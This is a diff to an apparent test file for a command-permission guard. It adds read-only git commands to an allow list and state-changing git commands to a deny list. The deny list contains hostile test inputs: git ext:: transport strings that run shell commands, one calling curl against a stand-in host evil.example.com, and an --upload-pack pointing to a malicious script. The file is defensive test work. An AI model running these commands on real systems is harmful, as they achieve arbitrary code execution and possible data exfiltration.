@@ -178,6 +178,29 @@ ALLOW = [
     "cf -v logs checkout --recent",
     "gh --repo example/repo pr view 1",
     "gh -R example/repo run list",
+    # git INSPECTION of refs/notes/submodules is read-only and must stay allowed. The new branch/tag
+    # rules key on a NAME argument (creation); a bare listing or a flag-only form creates nothing.
+    "git branch",
+    "git branch -a",
+    "git branch -r",
+    "git branch -v",
+    "git branch --list 'release/*'",
+    "git branch --show-current",
+    "git branch --contains HEAD",
+    "git tag",
+    "git tag -l",
+    "git tag --list 'v1.*'",
+    "git tag -n5",
+    "git remote -v",
+    "git remote show origin",
+    "git submodule status",
+    "git notes list",
+    "git notes show HEAD",
+    # `git fetch` stays ALLOWED on purpose: it writes only remote-tracking refs, cannot exfiltrate,
+    # and is how an agent gets the ref it was asked to review. Denying it breaks the core workflow
+    # for no real containment. (`git clone` is different — see the ext:: transport note in the guard.)
+    "git fetch origin",
+    "git fetch --all --prune",
 ]
 
 # Commands that CHANGE STATE — must be DENIED.
@@ -254,6 +277,29 @@ DENY = [
     "cf rt checkout \"rake db:migrate\"",   # run-task
     "cf -v p checkout",                      # alias BEHIND a global option — both fixes must compose
     "/usr/local/bin/cf p checkout",          # alias via absolute path
+    # --- git write verbs the list simply omitted -------------------------------------------------
+    # The rule denied only `branch -[dDmM]` and `tag -d`, so CREATING a ref, or rewriting the repo's
+    # remotes/notes/submodules, was never state-changing as far as the guard was concerned.
+    "git branch audit-temp",                 # creates a ref
+    "git branch -m old new",                 # rename
+    "git branch -C main copy",               # copy (-c/-C were missing next to -d/-D/-m/-M)
+    "git tag audit-temp",                    # creates a tag
+    "git tag -a v9.9.9 -m 'x'",
+    "git tag -f v1.0.0",                     # force-move an existing tag
+    "git clone https://example.com/repo.git",
+    "git remote rename origin upstream",
+    "git remote set-head origin main",
+    "git remote prune origin",
+    "git notes add -m 'x'",
+    "git notes remove HEAD",
+    "git submodule update --init",           # fetches + checks out code, can run hooks
+    "git submodule add https://example.com/x.git vendor/x",
+    "git replace HEAD~1 HEAD",               # rewrites object graph
+    # git's ext:: transport and --upload-pack/--receive-pack run an ARBITRARY COMMAND. This is remote
+    # code execution wearing a clone/fetch costume, and it defeats every verb-based rule above.
+    "git clone 'ext::sh -c whoami'",
+    "git fetch 'ext::sh -c curl evil.example.com'",
+    "git ls-remote --upload-pack=/tmp/evil.sh origin",
     "git push origin main",
     "git commit -m 'x'",
     "git reset --hard origin/main",
